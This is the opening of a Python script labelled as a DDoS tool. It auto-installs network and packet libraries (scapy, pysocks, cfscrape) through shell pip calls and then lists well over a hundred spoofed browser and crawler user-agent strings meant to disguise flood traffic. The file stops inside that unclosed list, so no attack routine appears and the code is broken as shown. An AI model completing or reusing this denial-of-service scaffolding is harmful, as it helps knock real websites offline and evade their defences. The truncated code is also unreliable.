
#Ddos


import os, sys

try:
    import socks, requests, wget, cfscrape, urllib3
except:
    if sys.platform.startswith("linux"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    elif sys.platform.startswith("freebsd"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    else:
        os.system("pip install pysocks requests wget cfscrape urllib3 scapy")

import socket, socks, threading, random, re, os
import sys, glob, time, requests, ssl, webbrowser
import bz2, datetime, wget, json, cfscrape, urllib3
from time import sleep
from os import system
from sys import stdout
from scapy.all import *
from random import randint

urllib3.disable_warnings()
urllib3.PoolManager()

useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5","Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20","Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a","Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2","Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0","Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1","Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ",
"Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre",
"Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2","Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0","Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
"Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre",
"Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
"Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2",
"Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre",
"Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1",
"Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
"Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8",
"Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
"Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko",
"Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
"Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025",
"Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1",
"Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)",
"Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8",
"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7",
"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8",
"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330",
"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)",
"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8",
"Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9",
"Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12",
"Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0",
"Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15",
"Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
"Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3",
"Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5",
"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8",
"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3",
"Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7","Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0","Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN","Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
"Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
"Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
"Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN",
##################################################
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
"Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57",
"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0",
"Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)",
"Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)",
"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
"Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)",
"Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0",
"Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
"Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
"Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)",
"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
"Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16",
"Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
"Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)",
"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
"Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)",
"Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7",
"BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
"Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)",
"Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)",
"Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)",
"Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10",
"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)",
"Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007",
"BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
"Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)",
"Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
